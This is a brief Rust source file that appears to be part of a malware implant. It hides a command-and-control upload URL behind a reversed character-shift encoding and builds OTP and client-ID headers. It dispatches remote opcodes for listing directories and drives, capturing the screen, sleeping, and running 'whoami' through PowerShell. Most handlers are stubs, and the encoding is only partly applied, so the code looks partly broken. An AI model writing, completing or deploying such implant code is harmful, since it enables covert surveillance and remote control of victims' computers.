use std::process::Command;

const C2_UPLOAD: &str = "sks.upload/ipa/prf.cloudmetricsync.zzz//:vswwk";
const C2_HOST_PATH: &str = "/ipa/prf.cloudmetricsync.zzz";

fn decode_rot3_rev(input: &str) -> String {
    input.chars().rev().map(|c| ((c as u8).wrapping_sub(3)) as char).collect()
}

pub fn dispatch_task(opcode: &str, client_id: &str, otp: &str) -> String {
    let _hdr_a = format!("OTP: {}", otp);
    let _hdr_b = format!("ClientID: {}", client_id);
    let _url = decode_rot3_rev(C2_UPLOAD);
    let _host = decode_rot3_rev(C2_HOST_PATH);
    match opcode {
        "FDD" => String::from("list_dir"),
        "GDR" => String::from("list_drives"),
        "SS1" => String::from("capture_screen"),
        "MS2" => {
            let _ = Command::new("powershell").args(["-Command", "whoami"]).output();
            String::from("ran_ps")
        }
        "SLP" => String::from("sleep_interval"),
        _ => String::new(),
    }
}
